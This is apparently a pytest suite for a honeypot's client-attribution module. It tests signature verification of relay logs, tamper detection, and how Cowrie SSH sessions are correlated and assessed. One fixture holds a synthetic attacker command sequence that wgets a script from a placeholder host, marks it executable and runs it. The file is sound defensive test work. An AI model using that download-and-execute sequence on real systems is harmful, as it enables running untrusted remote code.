"""Unit tests for client_attribution and its integration with threat_assessment 1.1 (Task 26A).

Relay records are produced by an independent test writer with controlled timestamps and an ephemeral Ed25519 key
(never the deployment key). Cowrie events are synthetic. No network, dataset or test-set access; nothing is executed.
"""
import copy
import hashlib
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from behavioural_evidence import EvidenceConfig, EvidenceEngine
from client_attribution import correlate, load_attribution_v2
from client_attribution.correlate import AttributionConfigV2
from client_attribution.records import GENESIS, RECORD_SCHEMA, canonical
from threat_assessment import AssessmentConfigError, AttributionConfig, PolicyConfig, ThreatAssessor, load_attribution_config, load_policy
from threat_assessment.config import canonical_digest

REPO = Path(__file__).resolve().parents[1]
T0 = datetime(2026, 11, 11, 18, 0, 0, tzinfo=timezone.utc)
RELAY = "172.22.0.2"
TEST_CLIENT, CONTROL_CLIENT, DEMO_RELAY = "10.250.25.3", "10.250.25.4", "10.250.25.2"
DEMO_LISTENER = f"{DEMO_RELAY}:2222"
PUBLISHED_LISTENER = "172.21.0.2:2222"
DIAG = ("99732d516898", "b806554e19b9")


def iso(t):
    return (T0 + timedelta(seconds=t)).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def keypair():
    k = Ed25519PrivateKey.generate()
    raw = k.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    pem = k.public_key().public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
    return k, pem, hashlib.sha256(raw).hexdigest()


KEY, PUB_PEM, PUB_SHA = keypair()
OTHER_KEY, OTHER_PEM, OTHER_SHA = keypair()


class Writer:
    """Independent re-implementation of the relay's record format, with explicit timestamps."""

    def __init__(self, key=KEY, key_sha=PUB_SHA):
        self.key, self.key_id, self.seq, self.prev, self.lines = key, key_sha[:16], 0, GENESIS, []

    def write(self, rtype, t, **fields):
        self.seq += 1
        rec = {"schema": RECORD_SCHEMA, "seq": self.seq, "prev_hash": self.prev, "record_type": rtype, "written_utc": iso(t),
               "key_id": self.key_id, **fields}
        h = hashlib.sha256(canonical(rec).encode("utf-8")).hexdigest()
        rec["record_hash"], rec["signature"] = h, self.key.sign(h.encode("ascii")).hex()
        self.prev = h
        self.lines.append(canonical(rec))
        return rec

    def start(self, t=-10):
        return self.write("relay_start", t, config_sha256="0" * 64, backend="cowrie:2222", public_key_sha256=PUB_SHA,
                          listeners=[{"name": "published", "mode": "published", "bind": "172.21.0.2", "port": 2222},
                                     {"name": "demo", "mode": "demo", "bind": DEMO_RELAY, "port": 2222}])

    def open(self, cid, uport, t, client=TEST_CLIENT, cport=40000, listener="demo", ingress=DEMO_LISTENER, accepted_local=None, dt=0.01):
        return self.write("connection_open", t + dt, connection_id=cid, listener=listener, listener_mode=listener, ingress_listener=ingress,
                          client_ip=client, client_port=cport, accepted_local=accepted_local or ingress, accepted_utc=iso(t),
                          upstream_local_ip=RELAY, upstream_local_port=uport, upstream_peer="172.22.0.1:2222", upstream_connected_utc=iso(t + dt))

    def close(self, cid, uport, t, client=TEST_CLIENT, cport=40000):
        return self.write("connection_close", t, connection_id=cid, listener="demo", client_ip=client, client_port=cport,
                          upstream_local_ip=RELAY, upstream_local_port=uport, closed_utc=iso(t), bytes_in=100, bytes_out=200)


ATT2 = {"schema": "threat-attribution-config-2", "config_version": "test-2", "source_field": "src_ip",
        "trusted_proxy_cidrs": ["172.22.0.2/32"], "relay_addresses": [RELAY],
        "proxy_client_mapping": {"verifier": "client_attribution", "public_key_sha256": PUB_SHA, "relay_upstream_addresses": [RELAY],
                                 "demo_listeners": [DEMO_LISTENER],
                                 "client_registry": {TEST_CLIENT: {"role": "test_client"}, CONTROL_CLIENT: {"role": "control_client"}},
                                 "correlation_skew_seconds": 2, "max_record_age_seconds": 3600,
                                 "key_validity": {"not_before": "2026-11-11T00:00:00Z", "not_after": "2026-12-11T00:00:00Z"}},
        "enforcement_excluded_sources": ["10.250.25.4/32"], "excluded_diagnostic_sessions": list(DIAG),
        "shared_source_cidrs": ["198.51.100.0/24"],
        "protected_cidrs": ["127.0.0.0/8", "172.22.0.0/16", "192.0.2.0/28", "10.250.25.1/32", "10.250.25.2/32"],
        "internal_cidrs": ["10.0.0.0/8"]}


def cfg2(doc=ATT2, tmp=None):
    m = doc["proxy_client_mapping"]
    from client_attribution.records import ts
    return AttributionConfigV2(doc=doc, digest=canonical_digest(doc), relay_upstream=tuple(m["relay_upstream_addresses"]),
                               demo_listeners=tuple(m["demo_listeners"]), registry=dict(m["client_registry"]),
                               excluded_sessions=frozenset(doc.get("excluded_diagnostic_sessions", [])),
                               skew_s=float(m["correlation_skew_seconds"]), max_record_age_s=float(m["max_record_age_seconds"]),
                               public_key_sha256=m["public_key_sha256"], key_not_before=ts(m["key_validity"]["not_before"]),
                               key_not_after=ts(m["key_validity"]["not_after"]))


def cev(sid, eventid, t, src=RELAY, **f):
    return {"eventid": eventid, "session": sid, "timestamp": iso(t), "src_ip": src, **f}


def cowrie_session(sid, uport, t, close_t=None, src=RELAY):
    out = [cev(sid, "cowrie.session.connect", t + 0.02, src=src, src_port=uport, dst_ip="172.22.0.1", dst_port=2222)]
    if close_t is not None:
        out.append(cev(sid, "cowrie.session.closed", close_t, src=src, duration="1.0"))
    return out


EVAL = T0 + timedelta(seconds=60)


def run(events, lines, pem=PUB_PEM, cfg=None, at=EVAL):
    return correlate(events, lines, pem, cfg or cfg2(), evaluation_time=at)


def happy(sid="s1", uport=50001, client=TEST_CLIENT):
    w = Writer()
    w.start()
    w.open("c1", uport, 0, client=client)
    w.close("c1", uport, 5, client=client)
    return cowrie_session(sid, uport, 0, close_t=5.01), w


# ------------------------------------------------------------------------------------------------ correlation
def test_exact_match_is_attributable_with_consistent_close():
    events, w = happy()
    out = run(events, w.lines)
    s = out["sessions"]["s1"]
    assert out["verification"]["ok"] and s["state"] == "attributable_via_proxy_mapping"
    assert (s["client_ip"], s["client_port"], s["client_role"], s["close_check"]) == (TEST_CLIENT, 40000, "test_client", "consistent")
    assert s["connection_id"] == "c1" and s["ingress_listener"] == DEMO_LISTENER and out["config_digest"] == canonical_digest(ATT2)


def test_open_session_is_attributable_with_session_open():
    w = Writer(); w.start(); w.open("c1", 50001, 0)
    s = run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]
    assert s["state"] == "attributable_via_proxy_mapping" and s["close_check"] == "session_open"


def test_missing_record():
    w = Writer(); w.start()
    assert run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_missing"


def test_wrong_port_is_missing():
    events, w = happy(uport=50001)
    events[0]["src_port"] = 50002
    assert run(events, w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_missing"


def test_outside_time_window_is_missing():
    w = Writer(); w.start(); w.open("c1", 50001, 0)
    assert run(cowrie_session("s1", 50001, 3.5), w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_missing"


def test_record_accepted_after_connect_is_missing():
    w = Writer(); w.start(); w.open("c1", 50001, 5)
    assert run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_missing"


def test_missing_src_port():
    events, w = happy()
    del events[0]["src_port"]
    assert run(events, w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_missing"


def test_ambiguous_tuple_reuse_within_window():
    w = Writer(); w.start(); w.open("c1", 50001, 0); w.open("c2", 50001, 0.5, client=CONTROL_CLIENT)
    s = run(cowrie_session("s1", 50001, 0.5), w.lines)["sessions"]["s1"]
    assert s["state"] == "unattributed:mapping_ambiguous" and set(s["connection_ids"]) == {"c1", "c2"}


def test_tuple_reuse_outside_window_is_unambiguous():
    w = Writer(); w.start(); w.open("c1", 50001, 0); w.close("c1", 50001, 1); w.open("c2", 50001, 30, client=CONTROL_CLIENT)
    out = run(cowrie_session("a", 50001, 0, close_t=1.01) + cowrie_session("b", 50001, 30), w.lines)["sessions"]
    assert out["a"]["client_ip"] == TEST_CLIENT and out["b"]["client_ip"] == CONTROL_CLIENT


def test_duplicated_connection_id():
    w = Writer(); w.start(); w.open("c1", 50001, 0); w.open("c1", 50009, 0)
    assert run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_duplicate"


def test_duplicated_close_record():
    w = Writer(); w.start(); w.open("c1", 50001, 0); w.close("c1", 50001, 5); w.close("c1", 50001, 5)
    assert run(cowrie_session("s1", 50001, 0, close_t=5), w.lines)["sessions"]["s1"]["state"] == "unattributed:mapping_duplicate"


def test_expired_record():
    events, w = happy()
    assert run(events, w.lines, at=T0 + timedelta(hours=2))["sessions"]["s1"]["state"] == "unattributed:mapping_expired"


def test_log_unavailable():
    events, _ = happy()
    out = run(events, None)
    assert out["sessions"]["s1"]["state"] == "unattributed:mapping_unavailable" and not out["verification"]["ok"]


# Task 26C (F-6): lines are verified independently. A damaged line no longer discards the whole log; the session whose
# records sit in the resulting gap is withheld (log_gap), and lines that leave no seq gap are rejected on their own.
@pytest.mark.parametrize("attack,expected", [
    ("modify_client", "unattributed:log_gap"), ("delete_record", "unattributed:log_gap"), ("reorder", "unattributed:log_gap"),
    ("truncate_signature", "unattributed:log_gap"), ("unsigned", "unattributed:log_gap"),
    ("append_garbage", "attributable_via_proxy_mapping"), ("insert_forged", "attributable_via_proxy_mapping")])
def test_tampered_log_never_attributes_damaged_records(attack, expected):
    events, w = happy()
    lines = list(w.lines)
    if attack == "modify_client":
        r = json.loads(lines[1]); r["client_ip"] = CONTROL_CLIENT; lines[1] = canonical(r)
    elif attack == "delete_record":
        del lines[0]
    elif attack == "reorder":
        lines[1], lines[2] = lines[2], lines[1]
    elif attack == "truncate_signature":
        r = json.loads(lines[1]); r["signature"] = r["signature"][:-2]; lines[1] = canonical(r)
    elif attack == "unsigned":
        r = json.loads(lines[1]); del r["signature"]; lines[1] = canonical(r)
    elif attack == "append_garbage":
        lines.append("{not json")
    elif attack == "insert_forged":                  # attacker without the key forges a record that links correctly
        f = Writer(OTHER_KEY, PUB_SHA); f.seq, f.prev = 3, json.loads(lines[2])["record_hash"]
        f.open("evil", 50001, 0, client="203.0.113.9"); lines.append(f.lines[0])
    out = run(events, lines)
    s1 = out["sessions"]["s1"]
    assert not out["verification"]["ok"] and s1["state"] == expected
    assert s1.get("client_ip") != "203.0.113.9" and (expected != "attributable_via_proxy_mapping" or s1["client_ip"] == TEST_CLIENT)


def test_records_signed_by_other_key():
    w = Writer(OTHER_KEY, OTHER_SHA); w.start(); w.open("c1", 50001, 0)
    out = run(cowrie_session("s1", 50001, 0), w.lines)
    assert out["sessions"]["s1"]["state"] == "unattributed:mapping_untrusted" and "key_id" in out["verification"]["reason"]


def test_supplied_public_key_not_pinned():
    events, w = happy()
    out = run(events, w.lines, pem=OTHER_PEM)
    assert out["sessions"]["s1"]["state"] == "unattributed:mapping_untrusted" and "pinned" in out["verification"]["reason"]


def test_unusable_public_key():
    events, w = happy()
    assert run(events, w.lines, pem=b"not a key")["sessions"]["s1"]["state"] == "unattributed:mapping_untrusted"


def test_record_outside_key_validity():
    doc = copy.deepcopy(ATT2); doc["proxy_client_mapping"]["key_validity"]["not_after"] = "2026-11-11T12:00:00Z"
    events, w = happy()
    assert run(events, w.lines, cfg=cfg2(doc))["sessions"]["s1"]["state"] == "unattributed:mapping_untrusted"


def test_published_listener_never_attributable():
    w = Writer(); w.start(); w.open("c1", 50001, 0, client="172.21.0.1", listener="published", ingress=PUBLISHED_LISTENER)
    assert run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]["state"] == "unattributed:published_listener"


def test_accepted_local_mismatch_is_inconsistent():
    w = Writer(); w.start(); w.open("c1", 50001, 0, accepted_local="172.21.0.2:2222")
    assert run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]["state"] == "unattributed:close_inconsistent"


def test_unregistered_peer():
    w = Writer(); w.start(); w.open("c1", 50001, 0, client="10.250.25.9")
    assert run(cowrie_session("s1", 50001, 0), w.lines)["sessions"]["s1"]["state"] == "unattributed:unregistered_peer"


def test_close_time_disagreement():
    events, w = happy()
    events[1]["timestamp"] = iso(20)
    assert run(events, w.lines)["sessions"]["s1"]["state"] == "unattributed:close_inconsistent"


def test_cowrie_closed_without_relay_close():
    w = Writer(); w.start(); w.open("c1", 50001, 0)
    assert run(cowrie_session("s1", 50001, 0, close_t=5), w.lines)["sessions"]["s1"]["state"] == "unattributed:close_inconsistent"


def test_close_matched_by_session_id_not_tuple():
    """Cowrie's close event has no src_port; a close of another session must not satisfy this one."""
    w = Writer(); w.start(); w.open("c1", 50001, 0); w.open("c2", 50002, 0.1); w.close("c2", 50002, 5)
    out = run(cowrie_session("a", 50001, 0, close_t=5) + cowrie_session("b", 50002, 0.1), w.lines)["sessions"]
    assert out["a"]["state"] == "unattributed:close_inconsistent"
    assert out["b"]["state"] == "attributable_via_proxy_mapping" and out["b"]["close_check"] == "session_open"


def test_multiple_connect_events():
    events, w = happy()
    events.append(dict(events[0]))
    assert run(events, w.lines)["sessions"]["s1"]["state"] == "unattributed:close_inconsistent"


def test_not_via_relay():
    events, w = happy()
    for e in events:
        e["src_ip"] = "203.0.113.50"
    assert run(events, w.lines)["sessions"]["s1"]["state"] == "unattributed:not_via_relay"


@pytest.mark.parametrize("sid", DIAG)
def test_diagnostic_sessions_excluded(sid):
    events, w = happy(sid=sid)
    assert run(events, w.lines)["sessions"][sid]["state"] == "excluded_diagnostic"


def test_no_retroactive_attribution_of_sessions_before_records():
    """A historical Cowrie session that predates every relay record cannot be attributed."""
    w = Writer(); w.start(t=100); w.open("c1", 50001, 100)
    assert run(cowrie_session("old", 50001, -86000), w.lines, at=T0 + timedelta(seconds=200))["sessions"]["old"]["state"] \
        == "unattributed:mapping_missing"


def test_correlation_is_pure_and_deterministic():
    events, w = happy()
    ev0, l0 = copy.deepcopy(events), list(w.lines)
    assert run(events, w.lines) == run(events, w.lines) and events == ev0 and w.lines == l0


# ------------------------------------------------------------------------------------------------ config
def test_v2_config_requires_mapping_and_exclusions():
    AttributionConfig.from_document(ATT2)
    for mut in ({"proxy_client_mapping": None}, {"enforcement_excluded_sources": None}):
        doc = copy.deepcopy(ATT2)
        for k, v in mut.items():
            if v is None:
                doc.pop(k) if k == "enforcement_excluded_sources" else doc.__setitem__(k, None)
        with pytest.raises(AssessmentConfigError):
            AttributionConfig.from_document(doc)


def test_v2_mapping_relays_must_be_configured_relays():
    doc = copy.deepcopy(ATT2); doc["proxy_client_mapping"]["relay_upstream_addresses"] = ["172.22.0.9"]
    with pytest.raises(AssessmentConfigError):
        AttributionConfig.from_document(doc)


def test_v1_still_rejects_mapping():
    doc = copy.deepcopy(ATT2); doc["schema"] = "threat-attribution-config-1"
    with pytest.raises(AssessmentConfigError):
        AttributionConfig.from_document(doc)


def test_repository_v2_configs_cross_verify():
    a = load_attribution_config(REPO / "configs" / "threat_attribution_v2.json")
    v2 = load_attribution_v2(REPO / "configs" / "threat_attribution_v2.json")
    p = load_policy(REPO / "configs" / "defence_policy_v2_1.json")
    assert a.mapping_enabled and a.digest == v2.digest == p.attribution_digest
    assert v2.excluded_sessions == frozenset(DIAG) and v2.demo_listeners == (DEMO_LISTENER,)
    assert v2.registry[CONTROL_CLIENT]["role"] == "control_client" and [str(n) for n in a.enforcement_excluded] == ["10.250.25.4/32"]
    pub = (REPO / v2.doc["proxy_client_mapping"]["public_key_path"]).read_bytes()
    from client_attribution.records import load_public_key
    assert load_public_key(pub)[1] == v2.public_key_sha256
    old = json.loads((REPO / "configs" / "defence_policy_v2.json").read_text(encoding="utf-8"))
    assert p.conditions == old["proposal_conditions"] and p.action == old["proposed_action"]


def test_assessment_package_holds_no_private_keys():
    """threat_assessment never loads or uses a private key; in client_attribution only the signer modules sign."""
    for f in (REPO / "threat_assessment").rglob("*.py"):
        src = f.read_text(encoding="utf-8")
        assert "load_pem_private_key" not in src and "PRIVATE KEY" not in src and ".sign(" not in src, f
    for f in (REPO / "client_attribution").rglob("*.py"):
        src = f.read_text(encoding="utf-8")
        assert "load_pem_private_key" not in src and "PRIVATE KEY" not in src, f
        # signing only in the signer modules and in the explicitly labelled TEST/LOCAL MOCK administrators (Task 28A)
        assert ".sign(" not in src or f.name in ("result.py", "checkpoints.py", "offhost_mock.py"), f


# ------------------------------------------------------------------------------------------------ assessment
# Task 26C (F-1): the unsigned correlation output and attribution config v2 can no longer attribute anything. The
# signed-result flow is tested in tests/test_trust_boundary.py.
ECFG = EvidenceConfig(relay_sources=frozenset({RELAY}), internal_networks=("10.0.0.0/8",))
PROPOSE_LINES = ["uname -a", "wget http://files.example/x.sh -O x.sh", "chmod +x x.sh", "./x.sh"]


def policy2(doc=ATT2):
    p = json.loads((REPO / "configs" / "defence_policy_v2.json").read_text(encoding="utf-8"))
    p["attribution_config"]["sha256_digest"] = canonical_digest(doc)
    return p


def assessor2(doc=ATT2):
    return ThreatAssessor(AttributionConfig.from_document(doc), PolicyConfig.from_document(policy2(doc)), ECFG)


def relay_cowrie_session(sid, uport, t=0, lines=PROPOSE_LINES, extra=None):
    out = [cev(sid, "cowrie.session.connect", t + 0.02, src_port=uport, dst_ip="172.22.0.1", dst_port=2222),
           cev(sid, "cowrie.login.success", t + 0.5, username="demo", password="demo-pass")]
    for k, ln in enumerate(lines):
        out.append(cev(sid, "cowrie.command.input", t + 1 + k, input=ln, **(extra or {})))
    out.append(cev(sid, "cowrie.session.closed", t + 1 + len(lines) + 0.01, duration="5.0"))
    return out


def demo(client=TEST_CLIENT, sid="d1", uport=50001, doc=ATT2):
    events = relay_cowrie_session(sid, uport)
    w = Writer(); w.start(); w.open("c1", uport, 0, client=client); w.close("c1", uport, 1 + len(PROPOSE_LINES))
    rec = {r["session_ref"]: r for r in EvidenceEngine(ECFG).evaluate(events)["sessions"]}[sid]
    return rec, run(events, w.lines, cfg=cfg2(doc))


@pytest.mark.parametrize("client", [TEST_CLIENT, CONTROL_CLIENT])
def test_unsigned_correlation_output_is_rejected(client):
    """The exact Task 26A integration (v2 config + unsigned correlate() output) now never attributes or proposes."""
    rec, ca = demo(client=client)
    out = assessor2().assess(rec, ca)
    assert out["tier"] == "review" and out["proposed_action"] is None
    assert out["session_attribution"]["state"] == "unattributed:result_rejected"
    assert not out["gates"]["5_attributable_source"] and not out["gates"]["7_verified_configuration_digests"]
    assert "unsigned" in out["versions"]["attribution_results"]["rejected"][0]["reason"]


def test_same_findings_and_severity_with_and_without_mapping():
    rec, ca = demo()
    a, b = assessor2().assess(rec, ca), assessor2().assess(rec)
    strip = lambda o: [{k: v for k, v in f.items() if k != "attribution"} for f in o["findings"]]
    assert strip(a) == strip(b) and a["session_evidence_level_reference"] == b["session_evidence_level_reference"]


def test_relay_session_without_mapping_stays_unattributed():
    rec, _ = demo()
    out = assessor2().assess(rec)
    assert out["tier"] == "review" and out["session_attribution"]["state"] == "unattributed:mapping_unavailable"
    assert not out["gates"]["5_attributable_source"] and out["proposed_action"] is None


def test_mapping_supplied_to_v1_config_abstains():
    v1 = {k: v for k, v in ATT2.items() if k not in ("enforcement_excluded_sources", "excluded_diagnostic_sessions")}
    v1 = dict(v1, schema="threat-attribution-config-1", proxy_client_mapping=None)
    rec, ca = demo()
    out = assessor2(v1).assess(rec, ca)
    assert out["tier"] == "abstain" and out["proposed_action"] is None


def test_evidence_record_and_mapping_not_modified():
    rec, ca = demo()
    r0, c0 = copy.deepcopy(rec), copy.deepcopy(ca)
    assessor2().assess(rec, ca)
    assert rec == r0 and ca == c0


def test_v1_behaviour_unchanged_for_direct_sources():
    v1 = {k: v for k, v in ATT2.items() if k not in ("enforcement_excluded_sources", "excluded_diagnostic_sessions")}
    v1 = dict(v1, schema="threat-attribution-config-1", proxy_client_mapping=None)
    events = [dict(e, src_ip="203.0.113.50") for e in relay_cowrie_session("x", 50001)]
    rec = EvidenceEngine(ECFG).evaluate(events)["sessions"][0]
    out = assessor2(v1).assess(rec)
    assert out["tier"] == "propose" and out["proposed_action"]["subject"] == "203.0.113.50"
    assert out["session_attribution"]["state"] == "attributable"
